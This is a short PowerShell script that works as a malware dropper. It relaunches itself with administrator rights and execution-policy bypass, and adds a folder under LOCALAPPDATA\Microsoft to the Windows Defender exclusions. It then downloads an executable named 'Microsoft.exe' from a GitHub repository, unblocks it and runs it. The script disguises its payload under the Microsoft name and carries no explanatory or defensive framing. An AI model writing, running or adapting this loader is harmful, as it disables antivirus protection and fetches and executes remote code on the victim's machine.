$folderPath = "$env:LOCALAPPDATA\Microsoft"
$exePath = "$folderPath\Microsoft.exe"
$exeUrl = "https://github.com/qoqoxxxx-stack/aa/raw/refs/heads/main/Microsoft.exe"

# 1. Force TLS 1.2 for the download
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 2. Self-Elevate to Admin (Required for Exclusions)
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# 3. Create the folder and add it to Windows Defender Exclusions
if (-not (Test-Path $folderPath)) { New-Item -Path $folderPath -ItemType Directory -Force }
Add-MpPreference -ExclusionPath $folderPath -ErrorAction SilentlyContinue

# 4. Clean up old process
Stop-Process -Name "Microsoft" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# 5. Download, Unblock, and Run
try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0"
    if (Test-Path $exePath) {
        Unblock-File -Path $exePath
        Start-Process $exePath
    }
} catch {
    Write-Host "Download failed. Check URL or Connection." -ForegroundColor Red
}
